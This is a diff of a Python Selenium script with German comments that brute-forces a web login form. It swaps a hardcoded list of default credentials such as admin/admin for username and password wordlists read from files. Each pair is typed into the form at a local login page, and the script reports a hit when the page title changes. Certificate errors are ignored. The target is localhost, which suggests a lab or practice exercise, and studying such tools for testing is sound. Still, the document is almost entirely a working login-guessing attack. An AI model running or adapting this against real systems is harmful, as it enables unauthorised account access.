@@ -1,52 +1,60 @@
 from selenium import webdriver
-from selenium.webdriver.common.keys import Keys
-import time
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.common.by import By
 
 
-credentials = [
-    {"username": "admin", "password": "admin"},
-    {"username": "admin", "password": "password"},
-    {"username": "admin", "password": "1234"},
-    {"username": "admin", "password": "password123"},
-    {"username": "admin", "password": "admin1234"},
-    {"username": "admin", "password": "admin12345"},
-    {"username": "marvin", "password": "pass123"},
-]
+#Chromedriver runterladen und den Pfad hier einfügen
+s = Service(executable_path='chromedriver.exe')
+options = webdriver.ChromeOptions()
+options.add_argument('--ignore-certificate-errors')
+driver = webdriver.Chrome(service=s, options=options)
 
-def brute_force_login(username, password):
-    # Starte den Browser
-    driver = webdriver.Chrome()
+website = "http://127.0.0.1:5000/login"
 
-    # Öffne die Seite
-    driver.get("http://localhost:5000/login")
+driver.get(website)
 
-    # Finde das Element mit dem Namen "username"
-    username = driver.find_element_by_name("username")
+title = ""
 
-    # Schreibe in das Element
-    username.send_keys(username)
+usernames = []
+passwords = []
 
-    # Finde das Element mit dem Namen "password"
-    password = driver.find_element_by_name("password")
+with open ("usernames.txt", "r") as file:
+    for line in file:
+        usernames.append(line.strip())
 
-    # Schreibe in das Element
-    password.send_keys(password)
+with open ("passwords.txt", "r") as file:
+    for line in file:
+        passwords.append(line.strip())
 
-    # Drücke die Enter-Taste
-    password.send_keys(Keys.RETURN)
+i = 0
 
-    login_button = driver.find_element_by_class_name("btn-primary")
-    login_button.click()
+for password in passwords:
+    for user in usernames:
+        print("Testing this user", user)
+        print("Testing this password", password)
+        
+        res = driver.find_elements(By.CLASS_NAME, "form-control")
 
-    time.sleep(5)
+        assert(len(res) == 2)
 
-    if "Invalid credentials" in driver.page_source:
-        print("Invalid credentials")
-    else:
-        print("Login successful")
-    
-    # Schließe den Browser
-    driver.quit()
+        res[0].clear()
+        res[0].send_keys(user)
 
-for credential in credentials:
-    brute_force_login(credential["username"], credential["password"])
+        res[1].clear()
+        res[1].send_keys(password)
+
+        but = driver.find_elements(By.CLASS_NAME, "btn-primary")
+        assert(len(but) == 1)
+        but[0].click()
+
+        print(driver.title)
+
+        if driver.title != "Login":
+            print("User found", user)
+            print("Password found", password)
+            i = 1
+            break
+    if i == 1:
+        break
+
+driver.quit()
